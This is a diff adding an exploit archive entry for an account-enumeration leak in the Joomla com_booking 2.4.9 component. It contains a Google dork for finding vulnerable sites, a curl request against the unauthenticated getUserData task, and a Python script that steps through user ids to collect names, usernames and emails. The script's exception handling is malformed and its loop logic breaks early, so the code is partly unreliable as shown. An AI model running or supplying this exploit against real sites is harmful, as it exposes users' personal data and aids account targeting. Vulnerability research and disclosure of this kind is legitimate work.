@@ -1,0 +1,107 @@
+id: 38877
+date: 07/19/2023
+title: Joomla com_booking component 2.4.9 - Information Leak (Account enumeration) Exploit
+author: qw3rTyTy
+cves: 
+
+# Exploit Title: Joomla! com_booking component 2.4.9 - Information Leak (Account enumeration)
+# Google Dork: inurl:"index.php?option=com_booking"
+# Exploit Author: qw3rTyTy
+# Vendor Homepage: http://www.artio.net/
+# Software Link: http://www.artio.net/downloads/joomla/book-it/book-it-2-free/download
+# Version: 2.4.9
+# Tested on: Slackware/Nginx/Joomla! 3.10.11
+#
+##
+# File: site/booking.php
+#
+# <?php
+# [...]
+#18 include_once (JPATH_COMPONENT_ADMINISTRATOR . DS . 'booking.php');
+# [...]
+#
+# File: admin/booking.php
+#
+# <?php
+# [...]
+#104 if (class_exists(($classname = AImporter::controller()))) {
+#105 $controller = new $classname();
+#106 /* @var $controller JController */
+#107 $controller->execute(JRequest::getVar('task'));
+#108 $controller->redirect();
+#109 }
+# [...]
+#
+# File: admin/controllers/customer.php
+#
+# <?php
+# [...]
+#240 function getUserData() {
+#241 $user = JFactory::getUser(JRequest::getInt('id'));
+#242 $data = array('name' => $user->name, 'username' => $user->username, 'email' => $user->email);
+#243 die(json_encode($data));
+#244 }
+# [...]
+#
+# A following GET request is equivalent to doing a query like 'SELECT name, username, email FROM abcde_users WHERE id=123'.
+#
+# curl -X GET http://target/joomla/index.php?option=com_booking&controller=customer&task=getUserData&id=123
+#
+# So, an attacker can easily enumerate all accounts by bruteforcing.
+#
+##
+import argparse
+import urllib.parse
+import requests
+from sys import exit
+from time import sleep
+
+def enumerateAccounts(options):
+    i = 1
+    url = options.url
+    url = url + "/index.php?option=com_booking&controller=customer&task=getUserData&id="
+
+    while True:
+        try:
+            response = requests.get("{}{}".format(url, str(i)))
+
+            if response.status_code == 200:
+                try:
+                    jsondocument = response.json()
+                    if jsondocument["name"] != None:
+                        print(jsondocument)
+                except requests.exceptions.JSONDecodeError:
+                    raise
+                else:
+                    break
+            except Exception as ex:
+                print(ex)
+                break
+
+        i += 1
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument("-u", "--url", type=str, required=True)
+    parsed = p.parse_args()
+
+    try:
+        t = urllib.parse.urlparse(parsed.url)
+    except ValueError as ex:
+        print(ex)
+        exit()
+
+    if not t[0].startswith("http") and not t[0].startswith("https"):
+        print("Improper URL given.")
+        exit()
+
+    if len(t[1]) == 0:
+        print("Improper URL given.")
+        exit()
+
+    enumerateAccounts(parsed)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-07-24]  #
